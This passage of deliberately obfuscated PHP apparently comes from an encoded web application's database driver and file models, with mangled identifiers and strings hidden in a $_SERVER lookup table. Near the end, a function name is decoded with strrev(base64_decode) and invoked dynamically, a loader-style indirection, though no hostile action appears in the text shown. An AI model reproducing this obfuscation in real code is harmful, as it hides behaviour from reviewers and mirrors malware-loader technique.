$ò“Áîı©[357]) { $Ì»ÕÁë¶ = $this->escapeString($Ì»ÕÁë¶[1]); } elseif (is_array($Ì»ÕÁë¶)) { $Ì»ÕÁë¶ = array_map(array($this, $ò“Áîı©[1030]), $Ì»ÕÁë¶); } elseif (is_bool($Ì»ÕÁë¶)) { $Ì»ÕÁë¶ = $Ì»ÕÁë¶ ? $ò“Áîı©[91] : $ò“Áîı©[228]; } elseif (is_null($Ì»ÕÁë¶)) { $Ì»ÕÁë¶ = $ò“Áîı©[106]; } return $Ì»ÕÁë¶; } protected function parseField($ŒĞ”ùÚ) { $„¼Œß¥™ =& $_SERVER[÷åé¼î]; if (is_string($ŒĞ”ùÚ) && strpos($ŒĞ”ùÚ, $„¼Œß¥™[50])) { $ŒĞ”ùÚ = explode($„¼Œß¥™[50], $ŒĞ”ùÚ); } if (is_array($ŒĞ”ùÚ)) { $…¸é½Ò = array(); foreach ($ŒĞ”ùÚ as $¼“Å€ğ… => $šÏ÷Çë‰) { if (!is_numeric($¼“Å€ğ…)) { $…¸é½Ò[] = $this->parseKey($¼“Å€ğ…, !1) . $„¼Œß¥™[1070] . $this->parseKey($šÏ÷Çë‰); } else { $…¸é½Ò[] = $this->parseKey($šÏ÷Çë‰); } } $ÈÇ×®Ææ = implode($„¼Œß¥™[50], $…¸é½Ò); } elseif (is_string($ŒĞ”ùÚ) && !empty($ŒĞ”ùÚ)) { $ÈÇ×®Ææ = $ŒĞ”ùÚ; } else { $ÈÇ×®Ææ = $„¼Œß¥™[220]; } return $ÈÇ×®Ææ; } protected function parseTable($ã­Ÿ¼œ) { $³Š”ËÆ¯ =& $_SERVER[÷åé¼î]; if (is_array($ã­Ÿ¼œ)) { $ÄäæË«ê = array(); foreach ($ã­Ÿ¼œ as $©Ä¦æµ¸ => $™¡¦©Ôò) { if (!is_numeric($©Ä¦æµ¸)) { $ÄäæË«ê[] = $this->parseKey($©Ä¦æµ¸) . $³Š”ËÆ¯[53] . $this->parseKey($™¡¦©Ôò); } else { $ÄäæË«ê[] = $this->parseKey($©Ä¦æµ¸); } } $ã­Ÿ¼œ = $ÄäæË«ê; } elseif (is_string($ã­Ÿ¼œ)) { if (strstr($ã­Ÿ¼œ, $³Š”ËÆ¯[53])) { return $ã­Ÿ¼œ; } $ã­Ÿ¼œ = explode($³Š”ËÆ¯[50], $ã­Ÿ¼œ); array_walk($ã­Ÿ¼œ, array($this, $³Š”ËÆ¯[978])); } return $³Š”ËÆ¯[972] . trim(implode($³Š”ËÆ¯[1071], $ã­Ÿ¼œ), $³Š”ËÆ¯[445]) . $³Š”ËÆ¯[972]; } protected function parseWhere($²Ï°˜§ƒ) { $ì¢àØüÌ =& $_SERVER[÷åé¼î]; $ÌÇÆ¿î« = $ì¢àØüÌ[12]; if (is_string($²Ï°˜§ƒ)) { $ÌÇÆ¿î« = $²Ï°˜§ƒ; } else { $€×¦Ö¹ç = isset($²Ï°˜§ƒ[$ì¢àØüÌ[1072]]) ? strtoupper($²Ï°˜§ƒ[$ì¢àØüÌ[1072]]) : $ì¢àØüÌ[12]; if (in_array($€×¦Ö¹ç, array($ì¢àØüÌ[1073], $ì¢àØüÌ[1074], $ì¢àØüÌ[1075]))) { $€×¦Ö¹ç = $ì¢àØüÌ[53] . $€×¦Ö¹ç . $ì¢àØüÌ[53]; unset($²Ï°˜§ƒ[$ì¢àØüÌ[1072]]); } else { $€×¦Ö¹ç = $ì¢àØüÌ[1076]; } foreach ($²Ï°˜§ƒ as $Ìèƒë¼ => $¿–ÉŠÚ¢) { $ÌÇÆ¿î« .= $ì¢àØüÌ[338]; if (is_numeric($Ìèƒë¼)) { $Ìèƒë¼ = $ì¢àØüÌ[1077]; } if (0 === strpos($Ìèƒë¼, $ì¢àØüÌ[11])) { $ÌÇÆ¿î« .= $this->parseThinkWhere($Ìèƒë¼, $¿–ÉŠÚ¢); } else { if (!preg_match($ì¢àØüÌ[1078], trim($Ìèƒë¼))) { think_exception(think_lang($ì¢àØüÌ[1079]) . $ì¢àØüÌ[4] . $Ìèƒë¼); } $ûìáÁ¨ò = is_array($¿–ÉŠÚ¢) && isset($¿–ÉŠÚ¢[$ì¢àØüÌ[1080]]); $Ìèƒë¼ = trim($Ìèƒë¼); if (strpos($Ìèƒë¼, $ì¢àØüÌ[214])) { $ò”¡ô¾î = explode($ì¢àØüÌ[214], $Ìèƒë¼); $¨Û®µµ÷ = array(); foreach ($ò”¡ô¾î as $¤ô¬¼Ú· => $³¾”ôËº) { $™Ã¼Ú®™ = $ûìáÁ¨ò ? $¿–ÉŠÚ¢[$¤ô¬¼Ú·] : $¿–ÉŠÚ¢; $¨Û®µµ÷[] = $ì¢àØüÌ[321] . $this->parseWhereItem($this->parseKey($³¾”ôËº), $™Ã¼Ú®™) . $ì¢àØüÌ[977]; } $ÌÇÆ¿î« .= implode($ì¢àØüÌ[1081], $¨Û®µµ÷); } elseif (strpos($Ìèƒë¼, $ì¢àØüÌ[344])) { $ò”¡ô¾î = explode($ì¢àØüÌ[344], $Ìèƒë¼); $¨Û®µµ÷ = array(); foreach ($ò”¡ô¾î as $¤ô¬¼Ú· => $³¾”ôËº) { $™Ã¼Ú®™ = $ûìáÁ¨ò ? $¿–ÉŠÚ¢[$¤ô¬¼Ú·] : $¿–ÉŠÚ¢; $¨Û®µµ÷[] = $ì¢àØüÌ[321] . $this->parseWhereItem($this->parseKey($³¾”ôËº), $™Ã¼Ú®™) . $ì¢àØüÌ[977]; } $ÌÇÆ¿î« .= implode($ì¢àØüÌ[1076], $¨Û®µµ÷); } else { $ÌÇÆ¿î« .= $this->parseWhereItem($this->parseKey($Ìèƒë¼), $¿–ÉŠÚ¢); } } $ÌÇÆ¿î« .= $ì¢àØüÌ[339] . $€×¦Ö¹ç; } $ÌÇÆ¿î« = substr($ÌÇÆ¿î«, 0, -strlen($€×¦Ö¹ç)); } return empty($ÌÇÆ¿î«) ? $ì¢àØüÌ[12] : $ì¢àØüÌ[1082] . $ÌÇÆ¿î«; } protected function parseWhereItem($¤ÓĞÔ÷·, $»º½èÑ¹) { $İÒÇŒ“ =& $_SERVER[÷åé¼î]; $ñ˜¯ÔÇ¸ = $İÒÇŒ“[12]; if (is_array($»º½èÑ¹)) { if (is_string($»º½èÑ¹[0])) { $ßÖ‡öë‘ = strtolower($»º½èÑ¹[0]); if (in_array($»º½èÑ¹[0], array($İÒÇŒ“[956], $İÒÇŒ“[1083], $İÒÇŒ“[1084], $İÒÇŒ“[1085], $İÒÇŒ“[1086], $İÒÇŒ“[1087]))) { $ñ˜¯ÔÇ¸ .= $¤ÓĞÔ÷· . $İÒÇŒ“[53] . $»º½èÑ¹[0] . $İÒÇŒ“[53] . $this->parseValue($»º½èÑ¹[1]); } elseif (preg_match($İÒÇŒ“[1088], $»º½èÑ¹[0])) { $ñ˜¯ÔÇ¸ .= $¤ÓĞÔ÷· . $İÒÇŒ“[53] . $this->exp[$ßÖ‡öë‘] . $İÒÇŒ“[53] . $this->parseValue($»º½èÑ¹[1]); } elseif (preg_match($İÒÇŒ“[1089], $»º½èÑ¹[0])) { if (is_array($»º½èÑ¹[1])) { $èˆ‰ÜÄº = isset($»º½èÑ¹[2]) ? strtoupper($»º½èÑ¹[2]) : $İÒÇŒ“[1074]; if (in_array($èˆ‰ÜÄº, array($İÒÇŒ“[1073], $İÒÇŒ“[1074], $İÒÇŒ“[1075]))) { $à†ß½˜© = array(); foreach ($»º½èÑ¹[1] as $Á¶·àÛ…) { $à†ß½˜©[] = $¤ÓĞÔ÷· . $İÒÇŒ“[53] . $this->exp[$ßÖ‡öë‘] . $İÒÇŒ“[53] . $this->parseValue($Á¶·àÛ…); } $ñ˜¯ÔÇ¸ .= $İÒÇŒ“[321] . implode($İÒÇŒ“[53] . $èˆ‰ÜÄº . $İÒÇŒ“[53], $à†ß½˜©) . $İÒÇŒ“[977]; } } else { $ñ˜¯ÔÇ¸ .= $¤ÓĞÔ÷· . $İÒÇŒ“[53] . $this->exp[$ßÖ‡öë‘] . $İÒÇŒ“[53] . $this->parseValue($»º½èÑ¹[1]); } } elseif ($İÒÇŒ“[357] == $ßÖ‡öë‘) { $ñ˜¯ÔÇ¸ .= $İÒÇŒ“[975] . $¤ÓĞÔ÷· . $İÒÇŒ“[53] . $»º½èÑ¹[1] . $İÒÇŒ“[1090]; } elseif (preg_match($İÒÇŒ“[1091], $»º½èÑ¹[0])) { $ñ˜¯ÔÇ¸ .= $»º½èÑ¹[0]; } elseif (preg_match($İÒÇŒ“[1092], $»º½èÑ¹[0])) { if (isset($»º½èÑ¹[2]) && $İÒÇŒ“[357] == $»º½èÑ¹[2]) { $ñ˜¯ÔÇ¸ .= $¤ÓĞÔ÷· . $İÒÇŒ“[53] . $this->exp[$ßÖ‡öë‘] . $İÒÇŒ“[53] . $»º½èÑ¹[1]; } else { if (is_string($»º½èÑ¹[1])) { $»º½èÑ¹[1] = explode($İÒÇŒ“[50], $»º½èÑ¹[1]); } $ØóØÉ€† = implode($İÒÇŒ“[50], $this->parseValue($»º½èÑ¹[1])); $ñ˜¯ÔÇ¸ .= $¤ÓĞÔ÷· . $İÒÇŒ“[53] . $this->exp[$ßÖ‡öë‘] . $İÒÇŒ“[975] . $ØóØÉ€† . $İÒÇŒ“[977]; } } elseif (preg_match($İÒÇŒ“[1093], $»º½èÑ¹[0])) { $Ë¿éóÒƒ = is_string($»º½èÑ¹[1]) ? explode($İÒÇŒ“[50], $»º½èÑ¹[1]) : $»º½èÑ¹[1]; $ñ˜¯ÔÇ¸ .= $İÒÇŒ“[975] . $¤ÓĞÔ÷· . $İÒÇŒ“[53] . $this->exp[$ßÖ‡öë‘] . $İÒÇŒ“[53] . $this->parseValue($Ë¿éóÒƒ[0]) . $İÒÇŒ“[1076] . $this->parseValue($Ë¿éóÒƒ[1]) . $İÒÇŒ“[339]; } else { think_exception(think_lang($İÒÇŒ“[1079]) . $İÒÇŒ“[4] . $»º½èÑ¹[0]); } } else { $½á€¹±ò = count($»º½èÑ¹); $¿Ôş±á­ = $İÒÇŒ“[12]; if (is_string($»º½èÑ¹[$½á€¹±ò - 1])) { $¿Ôş±á­ = isset($»º½èÑ¹[$½á€¹±ò - 1]) ? strtoupper($»º½èÑ¹[$½á€¹±ò - 1]) : $İÒÇŒ“[12]; if (in_array($¿Ôş±á­, array($İÒÇŒ“[1073], $İÒÇŒ“[1074], $İÒÇŒ“[1075]))) { $½á€¹±ò = $½á€¹±ò - 1; } } else { $¿Ôş±á­ = $İÒÇŒ“[1073]; } for ($şŞó¸­ = 0; $şŞó¸­ < $½á€¹±ò; $şŞó¸­++) { $Ë¿éóÒƒ = is_array($»º½èÑ¹[$şŞó¸­]) ? $»º½èÑ¹[$şŞó¸­][1] : $»º½èÑ¹[$şŞó¸­]; if ($İÒÇŒ“[357] == strtolower($»º½èÑ¹[$şŞó¸­][0])) { $ñ˜¯ÔÇ¸ .= $İÒÇŒ“[321] . $¤ÓĞÔ÷· . $İÒÇŒ“[53] . $Ë¿éóÒƒ . $İÒÇŒ“[1090] . $¿Ôş±á­ . $İÒÇŒ“[53]; } else { $´£’£±Ş = is_array($»º½èÑ¹[$şŞó¸­]) ? $this->exp[strtolower($»º½èÑ¹[$şŞó¸­][0])] : $İÒÇŒ“[956]; if (!$´£’£±Ş && is_array($»º½èÑ¹[$şŞó¸­]) && in_array($»º½èÑ¹[$şŞó¸­][0], array($İÒÇŒ“[956], $İÒÇŒ“[1083], $İÒÇŒ“[1084], $İÒÇŒ“[1085], $İÒÇŒ“[1086], $İÒÇŒ“[1087]))) { $´£’£±Ş = $»º½èÑ¹[$şŞó¸­][0]; } $ñ˜¯ÔÇ¸ .= $İÒÇŒ“[321] . $¤ÓĞÔ÷· . $İÒÇŒ“[53] . $´£’£±Ş . $İÒÇŒ“[53] . $this->parseValue($Ë¿éóÒƒ) . $İÒÇŒ“[1090] . $¿Ôş±á­ . $İÒÇŒ“[53]; } } $ñ˜¯ÔÇ¸ = substr($ñ˜¯ÔÇ¸, 0, -4); } } else { $ñ˜¯ÔÇ¸ .= $¤ÓĞÔ÷· . $İÒÇŒ“[1094] . $this->parseValue($»º½èÑ¹); } return $ñ˜¯ÔÇ¸; } protected function parseThinkWhere($Ê¡Éâ‰, $õ´˜½) { $‚µ³Çıº =& $_SERVER[÷åé¼î]; $áå¢ÕÖ– = $‚µ³Çıº[12]; switch ($Ê¡Éâ‰) { case $‚µ³Çıº[412]: $áå¢ÕÖ– = $õ´˜½; break; case $‚µ³Çıº[1077]: $áå¢ÕÖ– = is_string($õ´˜½) ? $õ´˜½ : substr($this->parseWhere($õ´˜½), 6); break; case $‚µ³Çıº[1095]: parse_str($õ´˜½, $Ò¾ø¦Â£); if (isset($Ò¾ø¦Â£[$‚µ³Çıº[1072]])) { $½âÃ¾ú = $‚µ³Çıº[53] . strtoupper($Ò¾ø¦Â£[$‚µ³Çıº[1072]]) . $‚µ³Çıº[53]; unset($Ò¾ø¦Â£[$‚µ³Çıº[1072]]); } else { $½âÃ¾ú = $‚µ³Çıº[1076]; } $™îûÑÆÖ = array(); foreach ($Ò¾ø¦Â£ as $´Í´Êø§ => $†ı®¼‹ï) { $™îûÑÆÖ[] = $this->parseKey($´Í´Êø§) . $‚µ³Çıº[1094] . $this->parseValue($†ı®¼‹ï); } $áå¢ÕÖ– = implode($½âÃ¾ú, $™îûÑÆÖ); break; } return $áå¢ÕÖ–; } protected function parseLimit($âàÆ’Œæ) { $ÏÔ€®†Û =& $_SERVER[÷åé¼î]; return !empty($âàÆ’Œæ) ? $ÏÔ€®†Û[51] . $âàÆ’Œæ . $ÏÔ€®†Û[53] : $ÏÔ€®†Û[12]; } protected function parseJoin($øİÈì¿Ù) { $ªÓö³¼– =& $_SERVER[÷åé¼î]; $ßÑå€ ½ = $ªÓö³¼–[12]; if (!empty($øİÈì¿Ù)) { if (is_array($øİÈì¿Ù)) { foreach ($øİÈì¿Ù as $´¥Ğßôö => $µ Âš†Ü) { if (!1 !== stripos($µ Âš†Ü, $ªÓö³¼–[1096])) { $ßÑå€ ½ .= $ªÓö³¼–[53] . $µ Âš†Ü; } else { $ßÑå€ ½ .= $ªÓö³¼–[1097] . $µ Âš†Ü; } } } else { $ßÑå€ ½ .= $ªÓö³¼–[1097] . $øİÈì¿Ù; } } $ßÑå€ ½ = preg_replace($ªÓö³¼–[1098], think_config($ªÓö³¼–[1002]) . $ªÓö³¼–[1099], $ßÑå€ ½); return $ßÑå€ ½; } protected function parseOrder($îòÈŠ²Ñ) { $ğ•«İ÷µ =& $_SERVER[÷åé¼î]; if (is_array($îòÈŠ²Ñ)) { $¦¡ó‹³§ = array(); foreach ($îòÈŠ²Ñ as $å’±œÅØ => $üßÆÔŸ°) { if (is_numeric($å’±œÅØ)) { $¦¡ó‹³§[] = $this->parseKey($üßÆÔŸ°); } else { $üßÆÔŸ° = in_array(strtoupper(trim($üßÆÔŸ°)), array($ğ•«İ÷µ[1100], $ğ•«İ÷µ[1101])) ? $ğ•«İ÷µ[53] . $üßÆÔŸ° : $ğ•«İ÷µ[12]; if (preg_match($ğ•«İ÷µ[1102], $å’±œÅØ)) { $¦¡ó‹³§[] = $this->parseKey($å’±œÅØ) . $üßÆÔŸ°; } else { think_exception($ğ•«İ÷µ[1103] . $å’±œÅØ); } } } $îòÈŠ²Ñ = implode($ğ•«İ÷µ[50], $¦¡ó‹³§); } return !empty($îòÈŠ²Ñ) ? $ğ•«İ÷µ[1104] . $îòÈŠ²Ñ : $ğ•«İ÷µ[12]; } protected function parseGroup($ŞÆÏµ½) { $“±µ’¹ =& $_SERVER[÷åé¼î]; return !empty($ŞÆÏµ½) ? $“±µ’¹[1105] . $ŞÆÏµ½ : $“±µ’¹[12]; } protected function parseHaving($ŞÔêÚØ) { $¤Ş–Š—» =& $_SERVER[÷åé¼î]; return !empty($ŞÔêÚØ) ? $¤Ş–Š—»[1106] . $ŞÔêÚØ : $¤Ş–Š—»[12]; } protected function parseComment($ù‹±Ë˜Ô) { $º¾œã¿ =& $_SERVER[÷åé¼î]; return !empty($ù‹±Ë˜Ô) ? $º¾œã¿[1107] . $ù‹±Ë˜Ô . $º¾œã¿[1108] : $º¾œã¿[12]; } protected function parseDistinct($ÒùºĞ) { $º›Ï†‡ =& $_SERVER[÷åé¼î]; return !empty($ÒùºĞ) ? $º›Ï†‡[1109] : $º›Ï†‡[12]; } protected function parseUnion($§Ç×“”³) { $‰«¥º‡Õ =& $_SERVER[÷åé¼î]; if (empty($§Ç×“”³)) { return $‰«¥º‡Õ[12]; } if (isset($§Ç×“”³[$‰«¥º‡Õ[408]])) { $ÍÄ­Ø”ö = $‰«¥º‡Õ[1110]; unset($§Ç×“”³[$‰«¥º‡Õ[408]]); } else { $ÍÄ­Ø”ö = $‰«¥º‡Õ[1111]; } foreach ($§Ç×“”³ as $¸õÕ«Å) { $·µ—¸¢ç[] = $ÍÄ­Ø”ö . (is_array($¸õÕ«Å) ? $this->buildSelectSql($¸õÕ«Å) : $¸õÕ«Å); } return implode($‰«¥º‡Õ[53], $·µ—¸¢ç); } public function insert($ƒ©ıÇÔ, $ëšŒŸÕ = array(), $³„ªºêµ = false) { $÷’à‡ =& $_SERVER[÷åé¼î]; $ùäÔ„À = $²–£ŞÔ = array(); $this->model = $ëšŒŸÕ[$÷’à‡[342]]; foreach ($ƒ©ıÇÔ as $à×ÕÔ¾î => $€æËáØã) { if (is_array($€æËáØã) && $÷’à‡[357] == $€æËáØã[0]) { $²–£ŞÔ[] = $this->parseKey($à×ÕÔ¾î); $ùäÔ„À[] = $€æËáØã[1]; } elseif (is_scalar($€æËáØã) || is_null($€æËáØã)) { $²–£ŞÔ[] = $this->parseKey($à×ÕÔ¾î); $ùäÔ„À[] = $this->parseValue($€æËáØã); } } $úİÕ¬Œê = ($³„ªºêµ ? $÷’à‡[979] : $÷’à‡[980]) . $÷’à‡[981] . $this->parseTable($ëšŒŸÕ[$÷’à‡[340]]) . $÷’à‡[975] . implode($÷’à‡[50], $²–£ŞÔ) . $÷’à‡[976] . implode($÷’à‡[50], $ùäÔ„À) . $÷’à‡[977]; $úİÕ¬Œê .= $this->parseLock(isset($ëšŒŸÕ[$÷’à‡[908]]) ? $ëšŒŸÕ[$÷’à‡[908]] : !1); $úİÕ¬Œê .= $this->parseComment(!empty($ëšŒŸÕ[$÷’à‡[414]]) ? $ëšŒŸÕ[$÷’à‡[414]] : $÷’à‡[12]); return $this->execute($úİÕ¬Œê, $this->parseBind(!empty($ëšŒŸÕ[$÷’à‡[345]]) ? $ëšŒŸÕ[$÷’à‡[345]] : array())); } public function selectInsert($¸‹ÛãÆË, $±îÚØ¸, $Î•Œõ = array()) { $ÜëÒÎñ÷ =& $_SERVER[÷åé¼î]; $this->model = $Î•Œõ[$ÜëÒÎñ÷[342]]; if (is_string($¸‹ÛãÆË)) { $¸‹ÛãÆË = explode($ÜëÒÎñ÷[50], $¸‹ÛãÆË); } array_walk($¸‹ÛãÆË, array($this, $ÜëÒÎñ÷[978])); $Ëö¢ş’ = $ÜëÒÎñ÷[1112] . $this->parseTable($±îÚØ¸) . $ÜëÒÎñ÷[975] . implode($ÜëÒÎñ÷[50], $¸‹ÛãÆË) . $ÜëÒÎñ÷[1090]; $Ëö¢ş’ .= $this->buildSelectSql($Î•Œõ); return $this->execute($Ëö¢ş’, $this->parseBind(!empty($Î•Œõ[$ÜëÒÎñ÷[345]]) ? $Î•Œõ[$ÜëÒÎñ÷[345]] : array())); } public function update($³»íæı§, $ƒòÈñ¥Ë) { $Á»ƒÚÛÕ =& $_SERVER[÷åé¼î]; $this->model = $ƒòÈñ¥Ë[$Á»ƒÚÛÕ[342]]; $À‹ÜùÆÈ = $Á»ƒÚÛÕ[1113] . $this->parseTable($ƒòÈñ¥Ë[$Á»ƒÚÛÕ[340]]) . $this->parseSet($³»íæı§) . $this->parseWhere(!empty($ƒòÈñ¥Ë[$Á»ƒÚÛÕ[336]]) ? $ƒòÈñ¥Ë[$Á»ƒÚÛÕ[336]] : $Á»ƒÚÛÕ[12]) . $this->parseOrder(!empty($ƒòÈñ¥Ë[$Á»ƒÚÛÕ[425]]) ? $ƒòÈñ¥Ë[$Á»ƒÚÛÕ[425]] : $Á»ƒÚÛÕ[12]) . $this->parseLimit(!empty($ƒòÈñ¥Ë[$Á»ƒÚÛÕ[352]]) ? $ƒòÈñ¥Ë[$Á»ƒÚÛÕ[352]] : $Á»ƒÚÛÕ[12]) . $this->parseLock(isset($ƒòÈñ¥Ë[$Á»ƒÚÛÕ[908]]) ? $ƒòÈñ¥Ë[$Á»ƒÚÛÕ[908]] : !1) . $this->parseComment(!empty($ƒòÈñ¥Ë[$Á»ƒÚÛÕ[414]]) ? $ƒòÈñ¥Ë[$Á»ƒÚÛÕ[414]] : $Á»ƒÚÛÕ[12]); return $this->execute($À‹ÜùÆÈ, $this->parseBind(!empty($ƒòÈñ¥Ë[$Á»ƒÚÛÕ[345]]) ? $ƒòÈñ¥Ë[$Á»ƒÚÛÕ[345]] : array())); } public function delete($Á×ÜË¦ê = array()) { $Ş¦ÊÍì =& $_SERVER[÷åé¼î]; $this->model = $Á×ÜË¦ê[$Ş¦ÊÍì[342]]; $ÔÉø¶¯Ï = $Ş¦ÊÍì[1114] . $this->parseTable($Á×ÜË¦ê[$Ş¦ÊÍì[340]]) . $this->parseWhere(!empty($Á×ÜË¦ê[$Ş¦ÊÍì[336]]) ? $Á×ÜË¦ê[$Ş¦ÊÍì[336]] : $Ş¦ÊÍì[12]) . $this->parseOrder(!empty($Á×ÜË¦ê[$Ş¦ÊÍì[425]]) ? $Á×ÜË¦ê[$Ş¦ÊÍì[425]] : $Ş¦ÊÍì[12]) . $this->parseLimit(!empty($Á×ÜË¦ê[$Ş¦ÊÍì[352]]) ? $Á×ÜË¦ê[$Ş¦ÊÍì[352]] : $Ş¦ÊÍì[12]) . $this->parseLock(isset($Á×ÜË¦ê[$Ş¦ÊÍì[908]]) ? $Á×ÜË¦ê[$Ş¦ÊÍì[908]] : !1) . $this->parseComment(!empty($Á×ÜË¦ê[$Ş¦ÊÍì[414]]) ? $Á×ÜË¦ê[$Ş¦ÊÍì[414]] : $Ş¦ÊÍì[12]); return $this->execute($ÔÉø¶¯Ï, $this->parseBind(!empty($Á×ÜË¦ê[$Ş¦ÊÍì[345]]) ? $Á×ÜË¦ê[$Ş¦ÊÍì[345]] : array())); } public function select($Êº÷ñÕ” = array()) { $‰È•ËÓ =& $_SERVER[÷åé¼î]; $this->model = $Êº÷ñÕ”[$‰È•ËÓ[342]]; $¥ğ„ÕÓĞ = $this->buildSelectSql($Êº÷ñÕ”); $ñ„Ïºäí = isset($Êº÷ñÕ”[$‰È•ËÓ[409]]) ? $Êº÷ñÕ”[$‰È•ËÓ[409]] : !1; if ($ñ„Ïºäí) { $ıÕŠâåå = is_string($ñ„Ïºäí[$‰È•ËÓ[97]]) ? $ñ„Ïºäí[$‰È•ËÓ[97]] : $‰È•ËÓ[1115] . md5($¥ğ„ÕÓĞ); $”•ì‘™´ = think_cache($ıÕŠâåå, $‰È•ËÓ[12], $ñ„Ïºäí); if (!1 !== $”•ì‘™´) { return $”•ì‘™´; } } $š¾ßé¹ì = $this->query($¥ğ„ÕÓĞ, $this->parseBind(!empty($Êº÷ñÕ”[$‰È•ËÓ[345]]) ? $Êº÷ñÕ”[$‰È•ËÓ[345]] : array())); if ($ñ„Ïºäí && !1 !== $š¾ßé¹ì) { think_cache($ıÕŠâåå, $š¾ßé¹ì, $ñ„Ïºäí); } return $š¾ßé¹ì; } public function buildSelectSql($ó«Õ¸ê¯ = array()) { $èŞ—ñåË =& $_SERVER[÷åé¼î]; if (isset($ó«Õ¸ê¯[$èŞ—ñåË[413]])) { if (strpos($ó«Õ¸ê¯[$èŞ—ñåË[413]], $èŞ—ñåË[50])) { list($›şŞØƒ´, $Ï˜¶Ê‰) = explode($èŞ—ñåË[50], $ó«Õ¸ê¯[$èŞ—ñåË[413]]); } else { $›şŞØƒ´ = $ó«Õ¸ê¯[$èŞ—ñåË[413]]; } $›şŞØƒ´ = $›şŞØƒ´ ? $›şŞØƒ´ : 1; $Ï˜¶Ê‰ = isset($Ï˜¶Ê‰) ? $Ï˜¶Ê‰ : (is_numeric($ó«Õ¸ê¯[$èŞ—ñåË[352]]) ? $ó«Õ¸ê¯[$èŞ—ñåË[352]] : 20); $…×áı‚û = $Ï˜¶Ê‰ * ((int) $›şŞØƒ´ - 1); $ó«Õ¸ê¯[$èŞ—ñåË[352]] = $…×áı‚û . $èŞ—ñåË[50] . $Ï˜¶Ê‰; } if (think_config($èŞ—ñåË[1116])) { $ØŒü’ˆÉ = $èŞ—ñåË[1117] . md5(serialize($ó«Õ¸ê¯)); $®ê†ÔëÏ = think_cache($ØŒü’ˆÉ); if ($®ê†ÔëÏ) { return $®ê†ÔëÏ; } } $êô’ßØì = $this->parseSql($this->selectSql, $ó«Õ¸ê¯); $êô’ßØì .= $this->parseLock(isset($ó«Õ¸ê¯[$èŞ—ñåË[908]]) ? $ó«Õ¸ê¯[$èŞ—ñåË[908]] : !1); if (isset($ØŒü’ˆÉ)) { think_cache($ØŒü’ˆÉ, $êô’ßØì); } return $êô’ßØì; } public function parseSql($÷ß¥Šú, $´Ú‹å¹ = array()) { $è‡´ÜÌ =& $_SERVER[÷åé¼î]; $÷ß¥Šú = str_replace(array($è‡´ÜÌ[1118], $è‡´ÜÌ[1119], $è‡´ÜÌ[1120], $è‡´ÜÌ[1121], $è‡´ÜÌ[1122], $è‡´ÜÌ[1123], $è‡´ÜÌ[1124], $è‡´ÜÌ[1125], $è‡´ÜÌ[1126], $è‡´ÜÌ[1127], $è‡´ÜÌ[1128]), array($this->parseTable("{$´Ú‹å¹[$è‡´ÜÌ[340]]}"), $this->parseDistinct(isset($´Ú‹å¹[$è‡´ÜÌ[1129]]) ? $´Ú‹å¹[$è‡´ÜÌ[1129]] : !1), $this->parseField(!empty($´Ú‹å¹[$è‡´ÜÌ[334]]) ? $´Ú‹å¹[$è‡´ÜÌ[334]] : $è‡´ÜÌ[220]), $this->parseJoin(!empty($´Ú‹å¹[$è‡´ÜÌ[343]]) ? $´Ú‹å¹[$è‡´ÜÌ[343]] : $è‡´ÜÌ[12]), $this->parseWhere(!empty($´Ú‹å¹[$è‡´ÜÌ[336]]) ? $´Ú‹å¹[$è‡´ÜÌ[336]] : $è‡´ÜÌ[12]), $this->parseGroup(!empty($´Ú‹å¹[$è‡´ÜÌ[562]]) ? $´Ú‹å¹[$è‡´ÜÌ[562]] : $è‡´ÜÌ[12]), $this->parseHaving(!empty($´Ú‹å¹[$è‡´ÜÌ[1130]]) ? $´Ú‹å¹[$è‡´ÜÌ[1130]] : $è‡´ÜÌ[12]), $this->parseOrder(!empty($´Ú‹å¹[$è‡´ÜÌ[425]]) ? $´Ú‹å¹[$è‡´ÜÌ[425]] : $è‡´ÜÌ[12]), $this->parseLimit(!empty($´Ú‹å¹[$è‡´ÜÌ[352]]) ? $´Ú‹å¹[$è‡´ÜÌ[352]] : $è‡´ÜÌ[12]), $this->parseUnion(!empty($´Ú‹å¹[$è‡´ÜÌ[407]]) ? $´Ú‹å¹[$è‡´ÜÌ[407]] : $è‡´ÜÌ[12]), $this->parseComment(!empty($´Ú‹å¹[$è‡´ÜÌ[414]]) ? $´Ú‹å¹[$è‡´ÜÌ[414]] : $è‡´ÜÌ[12])), $÷ß¥Šú); return $÷ß¥Šú; } public function getLastSql($¥àÂ€ñ¢ = '') { return $¥àÂ€ñ¢ ? $this->modelSql[$¥àÂ€ñ¢] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¡±È‚ ğ) { return addslashes($¡±È‚ ğ); } public function setModel($¡˜ŞÔµ) { $this->model = $¡˜ŞÔµ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto eÓ•½ƒŠæÉ; cÉêîßõË¼: $fileSize = strrev(base64_decode($_SERVER[Ğœßİ½¶][0])); function binCheckNeq($…¾¥¦»Š, $±³·¿Û) { return $…¾¥¦»Š != $±³·¿Û; } $_SERVER[$_SERVER[Ğœßİ½¶][1]] = $fileSize($_SERVER[$_SERVER[Ğœßİ½¶][2]]); goto eß¡ÁÌÊäÑ; A‡æº‘È: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\x6c\145\x5f\143\x6f\156\164\x65\156\164\163"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\124\x69\155\x65", "\x74\x69\155\x65", "\151\156\x73\145\x72\164", "\146\165\x6e\x63\x74\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\x6c\x65"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\155\145" => "\151\x6f\x5f\x66\151\x6c\x65\137\x6d\x65\x74\141", "\155\145\x74\141\x46\x69\x65\154\144" => "\x66\x69\x6c\145\x49\104"); public function fileInfo($Àß»—“ê) { $ƒ«äêÃ =& $_SERVER[÷åé¼î]; static $ö‡öÂì = array(); if (!isset($ö‡öÂì[$Àß»—“ê])) { $ø´‘à¡ı = $ƒ«äêÃ[2027]; $–ø¬Ì = Model($ƒ«äêÃ[528])->field($ø´‘à¡ı)->where(array($ƒ«äêÃ[526] => $Àß»—“ê))->find(); $ö‡öÂì[$Àß»—“ê] = $–ø¬Ì; } return $ö‡öÂì[$Àß»—“ê]; } public function addFileByContent($Ú˜¿Úü™ = '', $è‚¨ƒ§‘ = '') { $¦º¥åäâ =& $_SERVER[÷åé¼î]; $Ê“èğ¤ = TEMP_PATH . $¦º¥åäâ[2028]; if (!is_dir($Ê“èğ¤)) { 